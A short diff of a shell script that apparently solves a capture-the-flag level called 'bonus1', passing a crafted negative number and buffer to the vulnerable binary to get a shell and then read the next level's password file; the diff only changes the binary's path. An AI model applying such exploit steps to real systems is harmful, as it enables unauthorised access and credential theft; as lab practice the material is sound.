@@ -20,7 +20,7 @@ N_INPUT="-1073741813"
 BUFFER_INPUT="$(put 11 "${N}")"
 
 # We print our exploit to the input and wait for the reverse shell to open with cat
-./bonus1 "${N_INPUT}" "${BUFFER_INPUT}"
+/home/user/bonus1/bonus1 "${N_INPUT}" "${BUFFER_INPUT}"
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/bonus2/.pass
